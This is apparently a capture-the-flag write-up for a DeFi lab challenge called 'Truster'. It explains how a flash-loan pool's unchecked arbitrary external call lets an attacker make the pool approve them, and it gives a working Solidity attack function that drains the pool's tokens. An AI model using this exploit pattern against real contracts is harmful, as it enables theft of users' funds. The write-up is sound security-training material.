## Truster solution

The challenge is straighforward: we have to take all tokens out of the pool, preferably in a single transaction. In `flashLoan` function we can pass a `target` contract and an arbitrary `data` for our call on the target. There is also a check whether the token balance before the external call and after it is the same. The problem here is that the `msg.sender` of the external call would be the pool itself. Since it doesn't check the allowance the same way it checks the balance, an attacker can approve allowance for himself, passing the right data to the function, and then transfer all the tokens.

```
    function attack() public {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(
            address(pool),
            address(attacker),
            token.balanceOf(address(pool))
        );
    }
```